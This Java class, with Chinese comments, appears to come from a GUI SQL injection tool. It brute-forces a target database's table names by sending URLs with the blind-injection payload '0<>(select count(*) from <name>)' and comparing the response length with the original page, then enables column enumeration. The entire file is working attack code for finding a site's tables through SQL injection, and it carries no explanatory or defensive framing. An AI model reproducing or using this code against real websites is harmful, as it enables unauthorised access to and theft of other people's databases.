package com.sql;

import java.util.List;

import javax.swing.JButton;
import javax.swing.table.DefaultTableModel;

public class GetTableName implements Runnable{
	private String url;
	private String urlHead;
	private String urlEnd;
	private List<String> table;
	private boolean flag=true;
	private JButton parseTableBtn;
	private JButton parseColumnBtn;
	private DefaultTableModel showTable;
	private int contentLen;
	private List<String> tableName;
	public GetTableName(String url,String urlHead,String urlEnd,JButton parseTableBtn,JButton parseColumnBtn,DefaultTableModel showTable,List<String> table,List<String> tableName) {
		// TODO Auto-generated constructor stub
		this.url=url;
		this.urlEnd=urlEnd;
		this.urlHead=urlHead;
		this.parseTableBtn=parseTableBtn;
		this.parseColumnBtn=parseColumnBtn;
		this.showTable=showTable;
		this.table=table;
		this.contentLen=IsExistInjection.getContent(this.url).length();
		this.tableName=tableName;
	}
	@Override
	public void run() {
		int i=0;
		while(i<tableName.size()&&flag==true){// 对每一个数据字典中的表名都进行遍历、测试
			if (testTableName(tableName.get(i))){// 测试该表名是否存在
				table.add(tableName.get(i));// 若存在则添加到链表中
				Object[] obj={tableName.get(i)};
				showTable.addRow(obj);
			}
			i++;
		}
		parseTableBtn.setText("检测表名");
		if(!table.isEmpty())
			parseColumnBtn.setEnabled(true);
	}
	public boolean testTableName(String tableName) {// 测试每个表名是否正确
		String testUrl = urlHead + "0<>(select%20count(*)%20from%20"
				+ tableName + ")" + urlEnd;// %20代表空格 <>表示不等于
		try {
			if (IsExistInjection.isRightPage(this.contentLen, testUrl))
				return true;
			else
				return false;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
	}
	public void stop(){
		flag=false;
	}
}
